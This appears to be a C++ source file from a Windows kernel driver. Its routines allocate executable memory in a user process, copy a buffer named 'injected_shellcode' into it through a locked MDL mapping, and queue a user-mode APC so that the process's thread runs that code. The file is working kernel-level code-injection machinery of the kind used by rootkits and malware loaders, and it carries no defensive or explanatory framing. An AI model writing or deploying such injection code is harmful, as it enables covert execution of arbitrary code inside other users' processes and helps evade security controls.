#include "apc_routines.h"

void apc_routines::kernel_free_kapc(PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*)
{
	delete apc;
}

void apc_routines::rundown_free_kapc(PKAPC apc)
{
	delete apc;

	::ExReleaseRundownProtection(&g_rundown_protection);
}

void apc_routines::normal_inject_code(PVOID, PVOID, PVOID)
{
	void* address{ };
	size_t shellcode_size = sizeof(injected_shellcode);

	auto status = ::ZwAllocateVirtualMemory(
		NtCurrentProcess(),
		&address,
		0,
		&shellcode_size,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ
	);

	if (!NT_SUCCESS(status)) {
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not allocate memory in new process: 0x%p.\n", status));

		return;
	}

	auto mdl = ::IoAllocateMdl(
		address,
		sizeof(injected_shellcode),
		false,
		false,
		nullptr
	);

	if (!mdl) {
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not allocate a MDL.\n", status));

		return;
	}

	::MmProbeAndLockPages(
		mdl,
		KernelMode,
		IoReadAccess
	);

	auto mapped_address = ::MmMapLockedPagesSpecifyCache(
		mdl,
		KernelMode,
		MmNonCached,
		nullptr,
		false,
		NormalPagePriority
	);

	if (!mapped_address) {
		::MmUnlockPages(mdl);
		::IoFreeMdl(mdl);
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not get a system address for the MDL.\n", status));

		return;
	}

	status = ::MmProtectMdlSystemAddress(
		mdl,
		PAGE_READWRITE
	);

	if (!NT_SUCCESS(status)) {
		::MmUnmapLockedPages(mapped_address, mdl);
		::MmUnlockPages(mdl);
		::IoFreeMdl(mdl);
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not protect MDL address: 0x%p.\n", status));

		return;
	}

	::memcpy_s(mapped_address, sizeof(injected_shellcode), injected_shellcode, sizeof(injected_shellcode));

	::MmUnmapLockedPages(mapped_address, mdl);
	::MmUnlockPages(mdl);
	::IoFreeMdl(mdl);

	PKAPC apc = new (NonPagedPool, config::kDriverTag) KAPC;

	if (!apc) {
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not queue a user APC due to insufficient memory.\n"));

		return;
	}

	::KeInitializeApc(
		apc,
		::KeGetCurrentThread(),
		OriginalApcEnvironment,
		&apc_routines::kernel_free_kapc,
		&apc_routines::rundown_free_kapc,
		reinterpret_cast<PKNORMAL_ROUTINE>(address),
		UserMode,
		nullptr
	);

	auto inserted = ::KeInsertQueueApc(
		apc,
		nullptr,
		nullptr,
		0
	);

	if (!inserted) {
		delete apc;
		::ExReleaseRundownProtection(&g_rundown_protection);

		KdPrint(("[-] Could not insert a user APC.\n"));

		return;
	}

	KdPrint(("[+] Injected code and queued an APC successfully (pid=%d).\n", ::PsGetCurrentProcessId()));

	::ExReleaseRundownProtection(&g_rundown_protection);
}